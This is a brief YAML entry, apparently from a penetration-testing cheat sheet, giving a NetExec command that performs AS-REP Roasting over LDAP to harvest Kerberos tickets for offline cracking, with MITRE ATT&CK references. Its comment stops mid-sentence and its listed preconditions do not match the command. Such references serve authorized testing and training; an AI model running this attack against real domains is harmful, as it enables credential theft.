preconditions:
- a valid username
- an NTLM hash (pass-the-hash)
commands:
- template: nxc ldap 10.10.10.1 -u users.txt -p '' --asreproast output.txt
  comment: NetExec (formerly CrackMapExec) performs an AS-REP Roasting attack via the LDAP service. This
    command attempts to enumerate domain accounts that do not require pre-authentication and requests
    Kerberos AS-REP responses for them. The extracted encrypted ticket-granting ticket (TGT)
references:
- https://github.com/Pennyw0rth/NetExec
- https://attack.mitre.org/techniques/T1558/004/
